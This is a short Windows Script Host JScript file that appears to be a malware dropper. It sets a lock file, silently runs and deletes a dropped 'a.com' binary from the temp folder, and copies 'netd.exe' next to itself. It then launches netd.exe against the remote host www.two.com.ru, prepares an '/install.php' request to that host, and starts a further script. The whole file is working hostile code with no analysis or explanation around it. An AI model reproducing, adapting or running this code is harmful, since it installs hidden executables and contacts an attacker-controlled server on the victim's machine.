h="www.two.com.ru"
var s=new ActiveXObject('WScript.Shell');
var fs=new ActiveXObject('Scripting.FileSystemObject');
var p = WScript.ScriptFullName;
p = p.substr(0, p.lastIndexOf('\\')+1);

var locked = false;
try{
	var lock = fs.CreateTextFile(p+'lock', 2);
}catch(e){locked=true;}

if(!locked) main();

function main()
{
var env = s.Environment('Process');
tmp = env("TMP")+"\\";

var f = fs.CreateTextFile(tmp+'a.bat', 2);
f.Write('cd %TMP%\r\na.com\r\ndel a.com\r\ndel a.bat');
f.Close();

s.Run('command /c %TMP%\\a.bat', 0, true);

try{
	fs.CopyFile(tmp+'netd.exe', p+'netd.exe');
}catch(e){}

var f = fs.CreateTextFile(p+'i.js', 2);
f.Write('GET /install.php HTTP/1.0\nHost: '+h+'\n\n');
f.Close();

s.Run('\"'+p+'netd.exe\" h'+h, 0, true);
s.Run('wscript \"'+p+'o.js\"');
}
